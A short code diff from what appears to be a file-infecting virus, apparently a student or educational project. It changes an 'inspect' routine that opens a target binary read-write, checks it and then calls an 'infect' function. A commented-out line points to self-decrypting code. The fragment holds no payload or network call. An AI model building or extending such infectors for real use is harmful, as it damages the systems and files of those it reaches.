@@ -8,10 +8,12 @@ void	inspect(t_data *data, char *path)
 
 	char de[] = "inspect\n";
 	_write(1, de, 8);
+
 	if (data->context != true)
 		goto ERR;
 
 	struct stat st;
+
   	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
 		goto ERR;
 	if (_fstat(data->bin.fd, &st) < 0)
@@ -34,13 +36,12 @@ void	inspect(t_data *data, char *path)
 		goto ERR;
 	}
 	data->context = true;
+
 	_write(1, path, _strlen(path));
 	char de2[] = "\n";
 	_write(1, de2, 1);
 
 ERR:
 //	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
-	if (data->context == false)
-		_close(data->bin.fd);
 	infect(data);
 }
